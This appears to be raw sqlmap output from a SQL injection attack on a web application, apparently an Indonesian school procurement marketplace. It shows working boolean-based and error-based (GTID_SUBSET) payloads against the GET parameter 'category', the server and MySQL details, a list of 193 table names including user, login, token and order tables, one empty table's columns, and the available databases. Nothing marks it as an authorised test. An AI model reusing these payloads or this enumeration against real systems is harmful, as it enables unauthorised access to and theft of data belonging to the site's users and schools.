    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
Database: absahid
[193 tables]
+----------------------------------+
| buku                             |
| duplicat_product                 |
| duplicat_product_copy            |
| duplicat_product_copy2           |
| duplicat_product_fix             |
| duplicat_product_help            |
| ip_cart_history                  |
| ipr_activity                     |
| ipr_addons                       |
| ipr_agregasi_fail                |
| ipr_agregasi_fail2               |
| ipr_anggaran                     |
| ipr_anggaran_kegiatan            |
| ipr_anggaran_produk              |
| ipr_anggaran_sumber_dana         |
| ipr_api_djp                      |
| ipr_article                      |
| ipr_article_attachment           |
| ipr_article_category             |
| ipr_assign_product_cat           |
| ipr_assign_product_cat_bela      |
| ipr_auto_number                  |
| ipr_bank_mp                      |
| ipr_bank_mp_mapping              |
| ipr_bank_store                   |
| ipr_bank_user                    |
| ipr_berita                       |
| ipr_c_compare                    |
| ipr_c_compare_item               |
| ipr_c_compare_item_detail        |
| ipr_c_compare_store              |
| ipr_cart                         |
| ipr_cart_chat                    |
| ipr_cart_compare                 |
| ipr_cart_compare_item            |
| ipr_cart_compare_item_detail     |
| ipr_cart_item                    |
| ipr_cart_item_import             |
| ipr_cart_nego_item               |
| ipr_cart_nego_item_msg           |
| ipr_cart_new_demo                |
| ipr_categories_test              |
| ipr_checksums                    |
| ipr_classification               |
| ipr_code_dikbud                  |
| ipr_compare                      |
| ipr_compare_product              |
| ipr_complain                     |
| ipr_complain_detail              |
| ipr_complain_file                |
| ipr_complain_product             |
| ipr_cost_jaladara                |
| ipr_courier_partner              |
| ipr_courier_person               |
| ipr_courier_product              |
| ipr_districts                    |
| ipr_districts_pengawas           |
| ipr_ebilling                     |
| ipr_educations_pengawas          |
| ipr_etalase                      |
| ipr_featured_product             |
| ipr_featured_product_assign      |
| ipr_file_storage_item            |
| ipr_funds_pengawas               |
| ipr_hot_product                  |
| ipr_i18n_message                 |
| ipr_i18n_source_message          |
| ipr_jne                          |
| ipr_key_storage_item             |
| ipr_kloning_activity             |
| ipr_login                        |
| ipr_master_bank                  |
| ipr_master_json                  |
| ipr_master_kegiatan              |
| ipr_master_kekayaan              |
| ipr_master_kekayaan_cat          |
| ipr_master_mapping_code          |
| ipr_master_mapping_districts     |
| ipr_master_status                |
| ipr_master_status22              |
| ipr_master_status_copy           |
| ipr_master_status_copy2          |
| ipr_nego                         |
| ipr_nego_product                 |
| ipr_no_faktur                    |
| ipr_non_text_book_school_levels  |
| ipr_notification                 |
| ipr_npwp_dinas                   |
| ipr_option                       |
| ipr_option_value                 |
| ipr_order                        |
| ipr_order_address                |
| ipr_order_bast                   |
| ipr_order_compare                |
| ipr_order_compare_item           |
| ipr_order_compare_item_detail    |
| ipr_order_history                |
| ipr_order_nego_compare           |
| ipr_order_nego_item              |
| ipr_order_payment                |
| ipr_order_product                |
| ipr_order_store                  |
| ipr_page                         |
| ipr_payment_setting              |
| ipr_payment_to_store             |
| ipr_pengawas                     |
| ipr_ppn_tag                      |
| ipr_product                      |
| ipr_product_bundle               |
| ipr_product_bundle_import_result |
| ipr_product_category             |
| ipr_product_category_bela        |
| ipr_product_category_old         |
| ipr_product_districts            |
| ipr_product_etalase              |
| ipr_product_file                 |
| ipr_product_import               |
| ipr_product_import_result        |
| ipr_product_import_tbm           |
| ipr_product_price                |
| ipr_product_rating               |
| ipr_product_shipping             |
| ipr_product_sku                  |
| ipr_product_sku_2021             |
| ipr_product_sku_export           |
| ipr_product_spesification        |
| ipr_product_stock                |
| ipr_product_store                |
| ipr_product_tag                  |
| ipr_province                     |
| ipr_province_pengawas            |
| ipr_publishers                   |
| ipr_puskurbuk                    |
| ipr_quick_search                 |
| ipr_quick_search_product         |
| ipr_rbac_auth_assignment         |
| ipr_rbac_auth_item               |
| ipr_rbac_auth_item_child         |
| ipr_rbac_auth_rule               |
| ipr_request_efaktur              |
| ipr_roles_pengawas               |
| ipr_sekolah                      |
| ipr_sekolah_copy                 |
| ipr_sertel_pajak                 |
| ipr_setting_main                 |
| ipr_shipping_setting             |
| ipr_specs                        |
| ipr_specs_value                  |
| ipr_store                        |
| ipr_store_courier_partner        |
| ipr_store_detail                 |
| ipr_store_fav                    |
| ipr_store_file                   |
| ipr_store_owner                  |
| ipr_store_rating                 |
| ipr_store_user                   |
| ipr_store_wiljual                |
| ipr_subdistrict                  |
| ipr_sumber_dana                  |
| ipr_sumber_dana_sekolah          |
| ipr_system_db_migration          |
| ipr_system_log                   |
| ipr_system_rbac_migration        |
| ipr_tags                         |
| ipr_text_book_school_classes     |
| ipr_text_book_school_levels      |
| ipr_text_book_subjects           |
| ipr_timeline_event               |
| ipr_tmplogin                     |
| ipr_top_categories               |
| ipr_top_categories_header        |
| ipr_user                         |
| ipr_user_address                 |
| ipr_user_profile                 |
| ipr_user_sekolah                 |
| ipr_user_token                   |
| ipr_village                      |
| ipr_widget_carousel              |
| ipr_widget_carousel_item         |
| ipr_widget_menu                  |
| ipr_widget_text                  |
| ipr_wishlist                     |
| ipr_wishlist_product             |
| ipr_zona                         |
| ipr_zona_districts               |
| konfirm_oldist                   |
| matrik_ongkir                    |
| matrik_ongkir_150922             |
| matrik_ongkir_awal               |
| matrik_ongkir_lama               |
| matriks_depo                     |
| tracking_order                   |
| type_ongkir                      |
+----------------------------------+

Database: absahid
Table: ipr_categories_test
[0 entries]
+----+-----------+-------+--------+------------+------------+------------+------------+--------------+
| id | parent_id | is_ip | name   | created_at | deleted_at | kat_produk | updated_at | category_sub |
+----+-----------+-------+--------+------------+------------+------------+------------+--------------+
+----+-----------+-------+--------+------------+------------+------------+------------+--------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
available databases [7]:
[*] absahid
[*] information_schema
[*] mysql
[*] mysql_innodb_cluster_metadata
[*] performance_schema
[*] siplahintan
[*] sys



```